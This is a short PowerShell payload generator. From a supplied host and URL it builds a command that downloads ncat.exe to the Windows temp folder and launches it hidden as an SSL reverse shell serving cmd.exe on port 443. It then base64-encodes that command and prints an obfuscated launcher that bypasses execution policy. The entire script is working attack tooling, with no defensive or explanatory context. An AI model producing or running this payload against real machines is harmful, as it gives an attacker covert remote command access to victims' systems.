[CmdletBinding()]
param(
    [Parameter (Mandatory=$true)]
    [string] $HostAddress,
    
    [Parameter (Mandatory=$true)]
    [string] $DownloadUrl
    
)

$command = '$url = "{0}";$outpath = "C:\Windows\Temp\ncat.exe";Invoke-WebRequest -Uri $url -OutFile $outpath;$args = @("--ssl","{1}","443","--exec","cmd.exe");Start-Process -WindowStyle Hidden -FilePath $outpath -ArgumentList $args;' -f $DownloadUrl,$HostAddress
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

Write-Output "powershell.exe -nop -ep bypass -noni -encodedCommand ""$encodedCommand"" "
